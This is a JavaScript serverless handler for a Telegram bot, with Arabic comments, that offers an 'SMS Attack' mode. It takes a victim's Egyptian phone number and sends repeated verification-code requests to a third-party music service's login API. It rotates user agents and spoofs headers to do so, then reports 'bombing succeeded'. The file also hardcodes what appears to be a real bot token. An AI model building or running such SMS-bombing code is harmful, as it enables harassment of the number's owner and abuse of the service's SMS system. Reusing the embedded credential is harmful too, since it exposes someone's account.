const axios = require('axios');

// ==========================================
// ⚙️ إعدادات البوت
// ==========================================
const BOT_TOKEN = process.env.TELEGRAM_TOKEN || "8519648833:AAHeg8gNX7P1UZabWKcqeFJv0NAggRzS3Qs"; 
const ADMIN_ID = process.env.ADMIN_ID || "1431886140"; 
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// ==========================================
// 🛠️ منطق أداة SMS (من كود البايثون الخاص بك)
// ==========================================
async function sendTwistMenaSMS(number) {
    // 1. معالجة الرقم كما في ملف البايثون
    if (number.startsWith("01") && number.length === 11) {
        number = "2" + number;
    } else if (!number.startsWith("2")) {
        return "❌ الرقم غير صحيح. يجب أن يكون 01xxxxxxxxx";
    }

    const url = "https://api.twistmena.com/music/Dlogin/sendCode";

    // 2. تجهيز الهيدرز العشوائية (تم نقلها من كود البايثون)
    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
    ];

    const headers = {
        "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Referer": "https://www.google.com",
        "Origin": "https://www.example.com"
    };

    // 3. إرسال 3 طلبات متتالية (Batch) لمحاكاة التكرار
    let success = 0;
    const requests = [];

    for (let i = 0; i < 3; i++) {
        // توليد قيمة عشوائية كما في دالة random_string
        const randomVal = Math.random().toString(36).substring(7);
        const payload = { "dial": number, "randomValue": randomVal };

        // إضافة الطلب للقائمة
        requests.push(axios.post(url, payload, { headers: headers, timeout: 2500 }));
    }

    // تنفيذ الطلبات
    const results = await Promise.allSettled(requests);
    results.forEach(res => {
        if (res.status === 'fulfilled' && res.value.status === 200) success++;
    });

    if (success > 0) {
        return `✅ **تم القصف بنجاح!**\n📊 عدد الرسائل المرسلة: ${success}/3\n🎯 الضحية: \`${number}\``;
    } else {
        return "❌ فشل الإرسال. قد يكون الرقم محظوراً أو الخدمة متوقفة.";
    }
}

// ==========================================
// 🚀 المعالج الرئيسي (Handler)
// ==========================================
exports.handler = async function(event, context) {
    if (event.httpMethod !== "POST") return { statusCode: 405, body: "Method Not Allowed" };

    try {
        const body = JSON.parse(event.body);
        if (!body.message || !body.message.text) return { statusCode: 200, body: "No Text" };

        const chatId = body.message.chat.id;
        const text = body.message.text.trim();
        const firstName = body.message.from.first_name;
        
        let replyText = "";
        let keyboard = null;

        // القائمة الرئيسية
        const mainMenu = {
            keyboard: [
                [{ text: "💣 SMS Attack" }], // الزر الخاص بالأداة الجديدة
                [{ text: "🆔 معرفي" }, { text: "⏱️ حالة السيرفر" }]
            ],
            resize_keyboard: true
        };

        // --- الأوامر ---
        if (text === "/start") {
            replyText = `🔥 **أهلاً بك يا ${firstName}**\n\nتم تفعيل أداة **SMS Spam** (نسخة TwistMena) بنجاح.\nاضغط على الزر بالأسفل للتجربة 👇`;
            keyboard = mainMenu;
        }
        
        // زر الأداة
        else if (text === "💣 SMS Attack") {
            replyText = "😈 **مود SMS Spam**\n\nأرسل الرقم بهذا الشكل:\n`/sms 01xxxxxxxxx`";
        }
        
        // تنفيذ الأداة
        else if (text.startsWith("/sms ")) {
            const number = text.split(" ")[1];
            // استدعاء الدالة التي حولناها من بايثون
            replyText = await sendTwistMenaSMS(number);
        }

        // أوامر فرعية
        else if (text === "🆔 معرفي") replyText = `🆔 ID: \`${chatId}\``;
        else if (text === "⏱️ حالة السيرفر") replyText = "✅ السيرفر يعمل (Node.js/Netlify)";

        else {
            replyText = "⚠️ أمر غير معروف.";
            keyboard = mainMenu;
        }

        // إرسال الرد
        await axios.post(TELEGRAM_API, {
            chat_id: chatId,
            text: replyText,
            parse_mode: "Markdown",
            reply_markup: keyboard
        });

        return { statusCode: 200, body: "OK" };

    } catch (e) {
        console.error(e);
        return { statusCode: 500, body: "Error" };
    }
};
